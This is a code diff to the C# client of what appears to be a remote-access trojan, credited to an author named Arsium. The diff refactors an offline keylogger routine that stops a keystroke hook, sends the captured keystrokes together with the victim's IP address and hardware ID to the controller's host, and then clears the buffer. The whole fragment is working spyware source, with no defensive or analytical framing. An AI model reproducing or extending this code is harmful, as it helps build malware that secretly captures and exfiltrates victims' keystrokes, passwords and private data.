@@ -5,7 +5,6 @@ using System;
 using System.IO;
 using System.Net.Sockets;
 using System.Threading;
-using System.Windows.Forms;
 
 /* 
 || AUTHOR Arsium ||
@@ -68,11 +67,11 @@ namespace Client
             return false;
         }
 
-        private void StopOfflineKeyLogger()
+        internal static void StopOfflineKeyLogger()
         {
-            Plugin.Launch.StopHook();
-            Plugin.Launch.ClientSender(StarterClass.clientHandler.host, Config.generalKey, new KeylogOfflinePacket(Plugin.Launch.CurrentKeyStroke(), StarterClass.clientHandler.baseIp, StarterClass.clientHandler.HWID));
-            Plugin.Launch.ClearKeyStroke();
+            Offline.Keyloggers.Launch.StopHook();
+            Offline.Keyloggers.Launch.ClientSender(StarterClass.clientHandler.host, Config.generalKey, new KeylogOfflinePacket(Offline.Keyloggers.Launch.CurrentKeyStroke(), StarterClass.clientHandler.baseIp, StarterClass.clientHandler.HWID));
+            Offline.Keyloggers.Launch.ClearKeyStroke();
             StarterClass.KeylogOn = false; 
         }
 
@@ -85,8 +84,6 @@ namespace Client
                 ConnectedPacket connectionPacket = new ConnectedPacket();
                 this.HWID = connectionPacket.HWID;
                 SendPacket(connectionPacket);
-                if (StarterClass.KeylogOn)
-                    StopOfflineKeyLogger();
                 Receive();
             }
             else
